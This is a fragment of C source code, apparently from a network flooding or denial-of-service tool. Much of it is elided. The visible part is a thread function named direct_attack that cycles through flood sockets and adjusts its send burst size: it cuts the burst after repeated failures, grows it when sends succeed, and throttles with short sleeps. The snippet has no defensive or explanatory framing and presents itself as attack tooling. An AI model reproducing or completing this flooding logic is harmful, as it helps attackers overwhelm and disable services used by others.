...
void *direct_attack(void *arg) {
    ...
    while (!atomic_load(&stop_signal)) {
        ...
        for (int i = 0; i < FLOOD_SOCKETS && !atomic_load(&stop_signal); i++) {
            ...
            if (sent_this_burst == 0 && consecutive_fails > 5) {
                adaptive_burst = adaptive_burst > 20 ? adaptive_burst / 2 : 20;
                usleep(2000);
            } else if (sent_this_burst == adaptive_burst && consecutive_fails == 0) {
                if (adaptive_burst < MAX_BURST_SIZE) adaptive_burst += 4;
            } else if (sent_this_burst > 0 && sent_this_burst < adaptive_burst) {
                usleep(100);
            }
